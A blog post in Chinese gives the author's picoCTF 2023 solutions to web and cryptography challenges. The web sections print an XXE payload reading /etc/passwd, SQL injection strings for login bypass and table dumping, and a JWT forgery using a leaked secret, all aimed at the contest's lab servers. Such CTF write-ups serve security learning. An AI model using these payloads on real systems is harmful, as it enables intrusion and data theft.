<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>picoCTF 2023 Write Up | M3t30r</title><meta name="keywords" content="Security,CTF,Education,picoCTF"><meta name="author" content="Albert Huang,alb105322129@gmail.com"><meta name="copyright" content="Albert Huang"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="這次打picoCTF沒有升學壓力，相對2022也解了更多題(除了一些通靈題QAQ)，這次賽中解出了36&#x2F;45題，最後的名次是Global 200&#x2F;6925、Undergraduate Student 59&#x2F;2464，算是單刷picoCTF以來最好的成績，希望明年可以破台全類別:P(但看那個Web的解題人數，整個怕爆…)，以下會整理我picoCTF 2023有解出的題目解法!。P.S.看完比賽結果我">
<meta property="og:type" content="article">
<meta property="og:title" content="picoCTF 2023 Write Up">
<meta property="og:url" content="http://albert-notes.github.io/2023/03/30/picoctf-2023/index.html">
<meta property="og:site_name" content="M3t30r">
<meta property="og:description" content="這次打picoCTF沒有升學壓力，相對2022也解了更多題(除了一些通靈題QAQ)，這次賽中解出了36&#x2F;45題，最後的名次是Global 200&#x2F;6925、Undergraduate Student 59&#x2F;2464，算是單刷picoCTF以來最好的成績，希望明年可以破台全類別:P(但看那個Web的解題人數，整個怕爆…)，以下會整理我picoCTF 2023有解出的題目解法!。P.S.看完比賽結果我">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://albert-notes.github.io/img/picoctf.png">
<meta property="article:published_time" content="2023-03-30T10:09:42.000Z">
<meta property="article:modified_time" content="2023-03-30T14:07:00.317Z">
<meta property="article:author" content="Albert Huang">
<meta property="article:tag" content="Security">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Education">
<meta property="article:tag" content="picoCTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://albert-notes.github.io/img/picoctf.png"><link rel="shortcut icon" href="/img/fav.ico"><link rel="canonical" href="http://albert-notes.github.io/2023/03/30/picoctf-2023/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-30 22:07:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="M3t30r" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/alb.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/picoctf.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M3t30r</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/videos/"><i class="fa-fw fas fa-desktop"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/certificates/"><i class="fa-fw fas fa-certificate"></i><span> Certificates</span></a></div><div class="menus_item"><a class="site-page" href="/resources/"><i class="fa-fw fas fa-lightbulb"></i><span> Resources</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-address-card"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">picoCTF 2023 Write Up</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-03-30T10:09:42.000Z" title="Created 2023-03-30 18:09:42">2023-03-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-30T14:07:00.317Z" title="Updated 2023-03-30 22:07:00">2023-03-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">11.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>53min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="picoCTF 2023 Write Up"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>這次打picoCTF沒有升學壓力，相對2022也解了更多題(除了一些通靈題QAQ)，這次賽中解出了<strong>36/45</strong>題，最後的名次是<strong>Global 200/6925、Undergraduate Student 59/2464</strong>，算是單刷picoCTF以來最好的成績，希望明年可以破台全類別:P(但看那個Web的解題人數，整個怕爆…)，以下會整理我picoCTF 2023有解出的題目解法!。P.S.看完比賽結果我還是乖乖的去打Reverse好了.w.</p>
<p><img src="https://i.imgur.com/O5IpIfp.png"></p>
<h1 id="Web-Exploitation"><a href="#Web-Exploitation" class="headerlink" title="Web Exploitation"></a>Web Exploitation</h1><p>今年的Web一共有7題，其中的5題算是相對基本的題目，但剩下兩題加起來解題人數不到10人.w.。題目敘述會依照我認為的難度來區分顏色～</p>
<h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><div class="note success flat"><p>AUTHOR: GEOFFREY NJOGU</p>
<p>Description：<br>Help us test the form by submiting the username as <code>test</code> and password as <code>test!</code><br>The website running here.<br><strong>100 Points</strong></p>
</div>

<p>這題算是最簡單的題目了，連進去網站之後會發現一個登入介面，用它給我們的帳號密碼登入看看：</p>
<p><img src="https://i.imgur.com/MMxLkDp.png"></p>
<p>會發現一個像是查詢介面的東西，但它下面說他被redirected了，可以聯想他是302 Redirection的題目，用<code>F12</code>觀察一下原始碼，登入時第一個呼叫的檔案是<code>/login</code>，因此我們用<code>curl</code>來登入看看還沒redirected之前的內容。</p>
<p><img src="https://i.imgur.com/BX5CaE7.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -d &quot;username=test&amp;&amp;password=test!&quot; http://saturn.picoctf.net:52452/login</span><br><span class="line">Found. Redirecting to /next-page/id=cGljb0NURntwcm94aWVzX2Fs</span><br></pre></td></tr></table></figure>

<p>發現他所指向的是<code>/next-page/id=cGljb0NURntwcm94aWVzX2Fs</code>這個頁面，那再繼續追到下一層：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://saturn.picoctf.net:52452/next-page/id=cGljb0NURntwcm94aWVz</span><br><span class="line">X2Fs</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;flag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">           // after 2 seconds</span><br><span class="line">           window.location = &quot;/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==&quot;;</span><br><span class="line">        &#125;, 0.5)</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>他的下一層是<code>/next-page/id=bF90aGVfd2F5XzAxZTc0OGRifQ==</code>，而這兩段<code>id</code>很明顯是base64編碼，因此將它們拼接之後利用base64解碼即可獲得flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5XzAxZTc0OGRifQ==&quot; | base64 -d</span><br><span class="line">picoCTF&#123;proxies_all_the_way_01e748db&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h2><div class="note success flat"><p>AUTHOR: SUNDAY JACOB NWANYIM</p>
<p>Description<br>How about trying to match a regular expression<br>The website is running here.<br><strong>100 Points</strong></p>
</div>

<p>這題進到網頁之後會看到一個像是flag checker的輸入區，亂打東西進去會<code>alert(&#39;wrong match! Try again!&#39;);</code>，看看原始碼寫了些什麼：</p>
<p><img src="https://i.imgur.com/uvyxpJY.png"></p>
<p>這一段很明顯是條件限制的要求，而<code>^p.....F!?</code>是Regex的限制條件，再看看題目，很明顯<code>picoCTF</code>符合條件，因此輸入<code>picoCTF</code>即可獲得完整flag。</p>
<p><img src="https://i.imgur.com/hawCWAn.png"></p>
<h2 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h2><div class="note warning flat"><p>AUTHOR: GEOFFREY NJOGU</p>
<p>Description<br>The web project was rushed and no security assessment was done. Can you read the <code>/etc/passwd</code> file?<br>Web Portal<br><strong>100 Points</strong></p>
</div>

<p>這題是一個XXE的題目(Hint有寫)，所以進去之後馬上找有沒有輸入的介面，可以發現他的detail前面其實都有個被hidden的input欄位，把hidden去掉之後就是一個輸入介面了。</p>
<p><img src="https://i.imgur.com/UJ54wAg.png"></p>
<p>接下來就是找XXE的植入點，很明顯Details會執行input欄位的東西，因此看看他的source code看看如何運作：</p>
<p><img src="https://i.imgur.com/GKymE0E.png"></p>
<p>這是一個產出xml的過程，而input的內容則會被送進data中。但這裡的data會被送進HTML的<code>&lt;data&gt;</code>標籤裡面，XXE需要一個前置的標籤來設定XXE環境，因此將典型的XXE payload前置塞入<code>xml</code>的變數中，input欄位輸入<code>&amp;ent;</code>即可讀取任意檔案，payload如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--?xml version=&quot;1.0&quot; ?--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">replace</span> [<span class="meta">&lt;!ENTITY <span class="keyword">ent</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;ent;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/ZZpElnF.png"></p>
<h2 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h2><div class="note warning flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>Can you find the flag on this website.<br>Try to find the flag here.<br><strong>200 Points</strong></p>
</div>

<p>這題很明顯是SQL Injection的題目，連進去看看他是怎麼運作的。</p>
<p><img src="https://i.imgur.com/C76dCI9.png"></p>
<p>進去就是一個SQL Injection的典型登入介面，先亂打看看他的表達式：</p>
<p><img src="https://i.imgur.com/omrrFOD.png"></p>
<p>這是一個password在前面的表達式，那我們將password加上<code>&#39;OR 1=1--</code>即可繞過條件成功登入。登入後可以看到以下介面：</p>
<p><img src="https://i.imgur.com/iSvnDL5.png"></p>
<p>看來是個第二層的SQL Injection，查表格，但它是個盲注，先用<code>UNION</code>攻擊試試看。</p>
<p>Payload：<code>&#39; UNION SELECT 1,2,3--</code></p>
<p><img src="https://i.imgur.com/19cO6eD.png"></p>
<p>成功了，那麼就在裡面注入SQLite的SQL Injection攻擊指令吧!首先先查詢這個database有哪些表格，並且用<code>LIMIT</code>限制輸出的index：</p>
<p>Payload：<code>&#39; UNION SELECT (SELECT tbl_name FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39; LIMIT 3,1),2,3--</code></p>
<p><img src="https://i.imgur.com/Tq6qGxX.png"></p>
<p>用<code>LIMIT</code>前後尋找後可以發現一個叫做<code>more_table</code>的表格，再攻擊一次看看裡面有哪些欄位：</p>
<p>Payload：<code>&#39; UNION SELECT (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name =&#39;more_table&#39;),2,3--</code></p>
<p><img src="https://i.imgur.com/t9rQm6B.png"></p>
<p>裡面有一個叫做<code>flag</code>的欄位，用<code>SELECT</code>去讀取它即可獲得flag。</p>
<p>Payload：<code>&#39; UNION SELECT (SELECT flag FROM more_table),2,3--</code></p>
<p><img src="https://i.imgur.com/RFKWXDM.png"></p>
<h2 id="Java-Code-Analysis"><a href="#Java-Code-Analysis" class="headerlink" title="Java Code Analysis!?!"></a>Java Code Analysis!?!</h2><div class="note warning flat"><p>AUTHOR: NANDAN DESAI</p>
<p>Description<br>BookShelf Pico, my premium online book-reading service.<br>I believe that my website is super secure. I challenge you to prove me wrong by reading the ‘Flag’ book!<br>Here are the credentials to get you started:<br>Username: “user”<br>Password: “user”<br>Source code can be downloaded here.<br>Website can be accessed here!.<br><strong>300 Points</strong></p>
</div>

<p>這題又給了一個登入介面，用它給的帳號密碼登入看看。</p>
<p><img src="https://i.imgur.com/2M4DOZc.png"></p>
<p>裡面有一個叫做<code>FLAG</code>的pdf，很明顯flag應該在它裡面，但它需要Admin權限才能讀取，這時候回頭看看題目的Hint，應該是個關於JWT的題目，同時看看他給的<code>source.zip</code>，裡面也有JWT的相關JAVA設定，其中<code>SecretGenerator.java</code>裡面洩漏了JWT的secret key，表示我們可以直接攻破JWT Token來獲得Admin權限。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> io.github.nandandesai.pico.security;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.github.nandandesai.pico.configs.UserDataPaths;</span><br><span class="line"><span class="keyword">import</span> io.github.nandandesai.pico.utils.FileOperation;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecretGenerator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(SecretGenerator.class);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SERVER_SECRET_FILENAME</span> <span class="operator">=</span> <span class="string">&quot;server_secret.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserDataPaths userDataPaths;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">generateRandomString</span><span class="params">(<span class="type">int</span> len)</span> &#123;</span><br><span class="line">        <span class="comment">// not so random</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1234&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getServerSecret</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());</span><br><span class="line">            logger.info(<span class="string">&quot;Server secret successfully read from the filesystem. Using the same for this runtime.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> secret;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            logger.info(SERVER_SECRET_FILENAME+<span class="string">&quot; file doesn&#x27;t exists or something went wrong in reading that file. Generating a new secret for the server.&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">newSecret</span> <span class="operator">=</span> generateRandomString(<span class="number">32</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            logger.info(<span class="string">&quot;Newly generated secret is now written to the filesystem for persistence.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> newSecret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>從Application中拿出現在的JWT token，丟入jwt.io看看。</p>
<p><img src="https://i.imgur.com/9qTevIw.png"></p>
<p>更改我們所需要的資訊，並且輸入secret key以完成認證。</p>
<p><img src="https://i.imgur.com/v8NvEv5.png"></p>
<p>接著將jwt與payload送回網站，重整一次看看。</p>
<p><img src="https://i.imgur.com/LttlOWb.png"></p>
<p>我們現在是Admin的角色了，但不知為何在讀取FLAG時還是失敗了，因此我轉向另一個方向，現在我們可以操控Admin Dashboard的內容，於是將user的Role也設定成Admin。</p>
<p><img src="https://i.imgur.com/CbRORyK.png"></p>
<p>這時候重新登入user一次，便能讀取FLAG獲得flag了!</p>
<p><img src="https://i.imgur.com/IRTBi5M.png"></p>
<h1 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h1><p>這次的Crypto是我解最少的一個類別，只解出了7題中的4題，看來密碼學實力還需要再精進&gt;&lt;但這次的密碼學簡單部分的過度通靈，我覺得是所有類別中出得最差的一個…</p>
<h2 id="HideToSee"><a href="#HideToSee" class="headerlink" title="HideToSee"></a>HideToSee</h2><div class="note success flat"><p>AUTHOR: SUNDAY JACOB NWANYIM</p>
<p>Description<br>How about some hide and seek heh?<br>Look at this image here.<br><strong>100 Points</strong></p>
</div>

<p><img src="https://i.imgur.com/0a3pTH3.jpg"></p>
<p>這題給了一張圖片，看來是圖片隱寫術(但怎麼會放在這裡呢??這裡是密碼學欸= =)，經過了各種嘗試我在<a target="_blank" rel="noopener" href="https://futureboy.us/stegano/decinput.html">這個線上工具</a>裡面獲得了一些東西。它在這張圖片的輸出是<code>krxlXGU&#123;zgyzhs_xizxp_7142uwv9&#125;</code>，而這張圖片本身像是一個對應表，因此經過對應，並且維持原本的大小寫後即可得到flag。</p>
<p>P.S.這題是我覺得今年出得最爛的一題= =</p>
<h2 id="ReadMyCert"><a href="#ReadMyCert" class="headerlink" title="ReadMyCert"></a>ReadMyCert</h2><div class="note success flat"><p>AUTHOR: SUNDAY JACOB NWANYIM</p>
<p>Description<br>How about we take you on an adventure on exploring certificate signing requests<br>Take a look at this CSR file here.<br><strong>100 Points</strong></p>
</div>

<p>這題給了一個簽證檔案，馬上看看裡面寫了什麼。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat readmycert.csr</span><br><span class="line">-----BEGIN CERTIFICATE REQUEST-----</span><br><span class="line">MIICpzCCAY8CAQAwPDEmMCQGA1UEAwwdcGljb0NURntyZWFkX215Y2VydF80MWQx</span><br><span class="line">Yzc0Y30xEjAQBgNVBCkMCWN0ZlBsYXllcjCCASIwDQYJKoZIhvcNAQEBBQADggEP</span><br><span class="line">ADCCAQoCggEBAOdcDj2/m1LxBrXb3ch9+2BtKd3b8NFn4USXA5JORPfeGcDdIX4V</span><br><span class="line">SiRkFrbxLOit6SZwoAyWQ7SmWJTtzADbr82qTbVktGJj9YebwK57jpMEL6BPT9YA</span><br><span class="line">cE9AGFtVJycL+IXqtlTqAGq4DjcPtAs5THgIPDJ+aTgRDHP8YItfEFs+aywLd8kS</span><br><span class="line">WSmttEjS874Tc++b9PbQ246IIrtQ701/I1NB0S/inzQvPCui+hLSHgMFkGS4leN7</span><br><span class="line">7xJORGAQueRejKuYnOs6HbAlbK0oIWKR83BxkntDBee8KhOPDynHDgYoblERl8rL</span><br><span class="line">JAfcVogKNSniIztMkzh408V9mbLHOfsr6eUCAwEAAaAmMCQGCSqGSIb3DQEJDjEX</span><br><span class="line">MBUwEwYDVR0lBAwwCgYIKwYBBQUHAwIwDQYJKoZIhvcNAQELBQADggEBAFEyhXpa</span><br><span class="line">nZz/ofFW/31ryCF3nyvNg9pOyIniu8kcpiteSaOkNm4YREBCRwj92X3Wy1MUi/7Z</span><br><span class="line">urXwR1TcRTxLdPqeVBn4nsJclAgZqMKcT0ftz5fAM/Xg5whwBHEBb1qFVN+HGhPo</span><br><span class="line">1TKfhXunICyrjNWvM+2fudM2RPsGb0sBsjLAe1/6OJK82LJBoHQ0GlCPDN1tncrl</span><br><span class="line">lpzHACCFPv7LMVF9BSkZDCQNglU1NYDDelXZezfXLbio/a1RC2k4rs+jorVmFese</span><br><span class="line">elZFzORDsCzlgD87NvBUMZWI8J5+9fZeaWAQQfhwEiZOVn8IcjLUxUraxt4rbI/h</span><br><span class="line">0EUJJuCjGyTjRpQ=</span><br><span class="line">-----END CERTIFICATE REQUEST-----</span><br></pre></td></tr></table></figure>

<p>這坨東西經過了base64編碼，把它解碼之後就能發現flag在裡面了。</p>
<p><img src="https://i.imgur.com/uF4iBXL.png"></p>
<h2 id="rotation"><a href="#rotation" class="headerlink" title="rotation"></a>rotation</h2><div class="note success flat"><p>AUTHOR: LOIC SHEMA</p>
<p>Description<br>You will find the flag after decrypting this file<br>Download the encrypted flag here.<br><strong>100 Points</strong></p>
</div>

<p>這題給了一個很像Caesar Cipher的文字檔，但事實上，它就是Caesar Cipher(._.)，Brute Force之後即可獲得flag。</p>
<p><img src="https://i.imgur.com/TjvPajN.png"></p>
